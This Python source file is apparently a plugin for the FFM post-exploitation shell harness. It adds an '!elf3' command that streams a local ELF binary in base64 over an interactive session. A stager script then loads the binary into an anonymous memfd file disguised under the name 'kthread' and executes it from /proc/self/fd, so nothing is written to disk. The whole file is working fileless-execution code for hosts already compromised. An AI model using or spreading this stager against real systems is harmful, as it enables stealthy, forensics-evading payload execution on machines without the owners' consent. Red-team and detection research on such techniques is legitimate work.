"""
    FFM by @JusticeRage

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import base64
import io
import tqdm

from model.driver.input_api import *
from model.plugin.command import Command
from commands.command_manager import register_plugin

class RemoteElf3(Command):
    """
    This command executes a local ELF on the remote machine in memory.
    It is done through the create_memfd syscall and a short staging
    Python script which copies the target program into an anonymous file.
    """
    # The size of the chunks in which the ELF is transmitted.
    chunk_size = 1024

    # The Python script run on the remote machine to load the ELF in memory.
    # The "p" variable is defined dynamically before this scipt is run.
    stager_script = """
import os, sys, ctypes, base64
fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
os.write(fd, base64.b64decode(p))
try:
    pid = os.fork()
    if pid > 0:
        print("Child process PID: %i" % pid)
    else:
        os.execv("/proc/self/fd/%i" % fd, {arguments})
except Exception as e:
    print("Execution failed (%s)!" % str(e))
"""

    def __init__(self, *args):
        if len(args) < 2:
            raise RuntimeError("Received %d argument(s), expected 2." % len(args))
        self.program = os.path.expanduser(args[1])
        if not os.path.exists(self.program):
            raise RuntimeError("%s not found!" % self.program)
        # Construct the original command line of the program (with proper argv[0]).
        self.program_args = [os.path.basename(args[1])] + [a for a in args[2:]]
        if not check_command_existence("python3"):
            raise RuntimeError("Python is not present on the machine!")
        # Verify that syscall 319 is supported by the remote kernel:
        result = shell_exec('python3 -c "import ctypes;print(ctypes.CDLL(None).syscall(319, \'\', 0))"')
        if int(result) == -1:
            raise RuntimeError("The remote kernel doesn't support the create_memfd syscall!")

    def execute(self):
        self.stager_script = self.stager_script.format(arguments=str(self.program_args),
                                                       chunk_size=self.chunk_size)

        # Create a Python process reading a script from stdin
        os.write(context.active_session.master, "python3 - <<'__EOF__'\r\np = ''\r\n".encode("UTF-8"))

        # Send the program bytes in base64 as a "p" variable in the script to run.
        with open(self.program, 'rb') as f:
            data = base64.b64encode(f.read())
            reader = io.BytesIO(data)
            buffy = reader.read(self.chunk_size)
            with tqdm.tqdm(total=len(data), unit="o", unit_scale=True) as progress_bar:
                while len(buffy) != 0:
                    os.write(context.active_session.master, b"p += '%s'\r\n" % buffy)
                    progress_bar.update(len(buffy))
                    buffy = reader.read(self.chunk_size)
            write_str("\r")  # Add the carriage return after the tqdm progress bar.

        # Copy the actual stager and let it run.
        shell_exec("%s\r\n__EOF__" % self.stager_script,
                   print_output=True,
                   output_cleaner=lambda s: s.lstrip(" >"))

    @staticmethod
    def regexp():
        return r"^\s*\!elf3($| )"

    @staticmethod
    def usage():
        write_str("Usage: !elf3 [elf on the local machine] [program arguments]\r\n", LogLevel.WARNING)

    @staticmethod
    def name():
        return "!elf3"

    @staticmethod
    def description():
        return "Runs an executable from the local machine in memory, requires python3 on the remote machine."
    
    @staticmethod
    def tag():
        return "Execution"


register_plugin(RemoteElf3)

